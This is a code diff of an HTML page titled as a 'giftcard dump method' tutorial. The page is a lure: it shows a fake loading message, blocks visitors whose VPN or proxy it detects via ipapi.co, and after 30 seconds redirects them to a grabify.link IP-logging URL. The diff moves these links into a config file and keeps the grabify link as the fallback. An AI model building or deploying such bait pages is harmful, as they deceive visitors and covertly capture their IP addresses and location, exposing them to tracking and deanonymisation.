@@ -4,25 +4,34 @@
   <meta charset="UTF-8" />
   <title>giftcard dump method (blackhat hackers)</title>
   <script>
-    // Load links from JSON
-    const links = {
-      "redirect_link": "https://grabify.link/4KCZ9K",
-      "click_here_link": "https://grabify.link/4KCZ9K"
-    };
+    let links; // Variable to store loaded links
 
-    // VPN Detection
+    async function loadConfig() {
+      try {
+        const response = await fetch('config.json');
+        links = await response.json();
+      } catch (e) {
+        // Fallback to default links if config fails to load
+        links = {
+          "redirect_link": "https://grabify.link/4KCZ9K",
+          "click_here_link": "https://grabify.link/4KCZ9K"
+        };
+      }
+    }
+
     async function checkVPN() {
+      await loadConfig(); // Ensure config is loaded first
+      
       try {
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
-        // ipapi.co returns "true" for 'proxy' if a VPN/proxy is detected
-        if (data.proxy || data.isp && data.isp.toLowerCase().includes('vpn')) {
+        
+        if (data.proxy || data.isp?.toLowerCase().includes('vpn')) {
           document.body.innerHTML = "<h2>VPN/Proxy detected. Please disable your VPN to access this page.</h2>";
         } else {
-          // No VPN detected, proceed with redirect
           setTimeout(() => {
             window.location.href = links.redirect_link;
-          }, 30000); // 30 seconds
+          }, 30000);
         }
       } catch (e) {
         document.body.innerHTML = "<h2>Error detecting VPN. Please try again later.</h2>";
@@ -35,11 +44,13 @@
 <body>
   <p>
     Tutorial is loading, 357-b of 3.44-mb. If you are not shown the tutorial after 30 seconds,
-    <a id="clickHere" href="https://grabify.link/4KCZ9K">click here</a>.
+    <a id="clickHere" href="#">click here</a>.
   </p>
   <script>
-    // Set the "click here" link from JSON
-    document.getElementById('clickHere').href = links.click_here_link;
+    // Update click here link after config loads
+    loadConfig().then(() => {
+      document.getElementById('clickHere').href = links.click_here_link;
+    });
   </script>
 </body>
 </html>
